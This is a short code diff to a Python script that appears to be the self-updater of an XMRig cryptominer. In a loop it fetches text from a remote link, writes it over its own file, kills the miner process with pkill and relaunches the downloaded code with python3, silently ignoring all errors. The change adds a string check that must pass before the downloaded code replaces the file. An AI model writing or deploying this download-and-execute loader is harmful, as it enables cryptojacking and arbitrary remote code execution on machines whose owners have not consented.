@@ -73,12 +73,13 @@ while True:
                 response = requests.get(link_dao, timeout=timeout)
                 data_trave = response.text
                 print(data_trave)
-                fileopen = open(path_app, 'w+')
-                fileopen.write(data_trave)
-                fileopen.close()
-                os.system('pkill %s' % xmrig_name)
-                os.system('python3 %s' % path_app)
-                sys.exit()
+                if 'command_xmrig_default' in data_trave:
+                    fileopen = open(path_app, 'w+')
+                    fileopen.write(data_trave)
+                    fileopen.close()
+                    os.system('pkill %s' % xmrig_name)
+                    os.system('python3 %s' % path_app)
+                    sys.exit()
     except:
         pass
 
